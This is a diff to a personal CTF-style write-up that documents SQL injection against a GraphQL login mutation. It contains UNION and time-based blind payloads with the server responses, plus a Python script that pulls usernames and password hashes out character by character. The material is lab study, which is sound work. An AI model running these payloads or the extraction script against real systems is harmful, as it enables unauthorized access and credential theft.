@@ -197,4 +197,164 @@ And important queries
 "types":[{"name":"Query","fields":[{"name":"_dummy","args":[]}]},{"name":"String","fields":null},{"name":"Mutation","fields":[{"name":"LoginUser","args":[{"name":"username","description":null,"type":{"name":null,"kind":"NON_NULL","ofType":{"name":"String","kind":"SCALAR"}}},{"name":"password","description":null,"type":{"name":null,"kind":"NON_NULL","ofType":{"name":"String","kind":"SCALAR"}}}]},{"name":"verify2FA","args":[{"name":"otp","description":null,"type":{"name":null,"kind":"NON_NULL","ofType":{"name":"String","kind":"SCALAR"}}}]}]},{"name":"Response","fields":[{"name":"message","args":[]},{"name":"token","args":[]}]},
 ```
 
-# Others
+
+### SQL Injection
+
+![](Pasted%20image%2020221205162705.png)
+
+#### Get number of columns
+Later will be a list of queries & output
+
+```json
+{"query":"mutation {\n    LoginUser(username: \"' UNION SELECT 1 #\", password: \"admin\"){\n        message,\n        token    \n}\n}"}
+```
+
+```json
+{"errors":[{"message":"Error: ER_WRONG_NUMBER_OF_COLUMNS_IN_SELECT: The used SELECT statements have a different number of columns","locations":[{"line":2,"column":5}],"path":["LoginUser"]}],"data":{"LoginUser":null}}
+```
+
+```json
+{"query":"mutation {\n    LoginUser(username: \"' UNION SELECT 1,2 #\", password: \"admin\"){\n        message,\n        token    \n}\n}"}
+```
+
+```json
+{"errors":[{"message":"Invalid username or password!","locations":[{"line":2,"column":5}],"path":["LoginUser"]}],"data":{"LoginUser":null}}
+```
+
+### Guessing Table lmao
+
+```json
+{"query":"mutation {\n    LoginUser(username: \"' UNION SELECT username,passworda FROM users#\", password: \"admin\"){\n        message,\n        token    \n}\n}"}
+```
+
+```json
+{"errors":[{"message":"Error: ER_BAD_FIELD_ERROR: Unknown column 'passworda' in 'field list'","locations":[{"line":2,"column":5}],"path":["LoginUser"]}],"data":{"LoginUser":null}}
+```
+
+```json
+{"query":"mutation {\n    LoginUser(username: \"' UNION SELECT username,password FROM users#\", password: \"admin\"){\n        message,\n        token    \n}\n}"}
+```
+
+```json
+{"errors":[{"message":"Invalid username or password!","locations":[{"line":2,"column":5}],"path":["LoginUser"]}],"data":{"LoginUser":null}}
+```
+
+### Trying error based
+
+
+Since I can see the error, it is likely an error based SQL Injection
+
+
+### Nvm lazy, stick to time based
+
+```json
+
+{"query":"mutation {\n    LoginUser(username: \"' UNION SELECT 1, IF(1=1,SLEEP(10),'a') #\", password: \"admin\"){\n        message,\n        token    \n}\n}"}
+```
+
+Got delay
+```json
+{"errors":[{"message":"Invalid username or password!","locations":[{"line":2,"column":5}],"path":["LoginUser"]}],"data":{"LoginUser":null}}
+```
+
+H'mm I tried coding something
+but I got this
+
+```
+(base) [hacker@hackerbook BeautyCare]$ /bin/sh /tmp/geany_run_script_8JOOW1.sh
+Running!
+<html>
+<head><title>429 Too Many Requests</title></head>
+<body>
+<center><h1>429 Too Many Requests</h1></center>
+<hr><center>nginx/1.18.0 (Ubuntu)</center>
+</body>
+</html>
+```
+
+Shag have to rate limit
+```python
+import requests, string, sys
+import time
+import json
+URL = "http://10.129.255.46/graphql"
+
+delay = 5
+
+
+def query(pos, char, entry):
+  # Entry is the no. row
+  query = f"SUBSTRING((SELECT username FROM users LIMIT {entry},1), {pos}, 1) = '{char}'"
+  return {
+    "query": "mutation {LoginUser(username: \"' UNION SELECT 1, IF("+query+",SLEEP(10),1) #\", password: \"admin\"){message,token}}"
+  }
+  
+#print(query(1, 1, 1))
+chars = string.ascii_letters + '0123456789' + string.punctuation
+
+print("Running!")
+
+for e in range(0,100):
+    for i in range(1, 100):
+        found = False
+        for c in chars:
+            time.sleep(3)
+            try:
+                r = requests.post(
+                  URL,
+                  #data=json.dumps(query(i,c,e)),
+                  json=query(i,c,e),
+                  timeout=delay)
+                #print(r.text)
+                if e==0 and c == chars[-1] and i==1:
+                    print(r.text)
+                    exit()
+            except requests.exceptions.Timeout:
+                sys.stdout.write(c)
+                sys.stdout.flush()
+                found = True
+                break
+        if not found:
+            break
+    sys.stdout.write('\n')
+ 
+print("\nDone! Try Harder!")
+```
+
+```bash
+(base) [hacker@hackerbook BeautyCare]$ /bin/sh /tmp/geany_run_script_UFHAW1.sh
+Running!
+john
+
+^CTraceback (most recent call last):
+  File "sqli.py", line 25, in <module>
+    time.sleep(3)
+KeyboardInterrupt
+
+(base) [hacker@hackerbook BeautyCare]$
+```
+
+
+```bash
+(base) [hacker@hackerbook BeautyCare]$ /bin/sh /tmp/geany_run_script_DRY5V1.sh
+Running!
+5a6cd4edabc935M
+```
+
+`5a6cd4edabc935M`
+
+```
+5a6cd4edabc93c6
+
+________c_______
+_a__eda_c____c__
+
+5a6
+___4edabc93x8cT
+__________308c
+5a64edabc93c6
+
+5a64edabc9358c6
+5a64edabc9358c60
+```
+# Other
